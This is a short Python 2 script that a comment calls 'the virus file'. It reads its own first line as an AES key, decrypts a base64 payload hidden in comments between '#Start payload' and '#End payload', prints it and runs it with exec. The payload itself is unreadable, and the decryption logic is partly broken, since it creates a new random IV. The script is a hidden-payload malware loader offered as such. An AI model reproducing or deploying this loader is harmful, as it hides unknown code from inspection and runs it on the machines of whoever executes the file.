######################################################## First script python
# coding=utf-8
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

def encrypt(data):
   if len(data) % 8 != 0:
      toAdd = 8 - len(data) % 8
      print 'Ecryption DES ' + str(toAdd)

   this = open(__main__.__file__, 'r')
   key = this.readline()
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   #missing_padding = 4 - len(data) % 4
   #if missing_padding != 0:
    #    data += b'='* missing_padding
     #   print 'Encryption Missing padding ' + str(missing_padding)

   return base64.b64encode(encrypted)

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload)
print e
exec e

sys.exit('Good job!')
#Start payload
#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
#End payload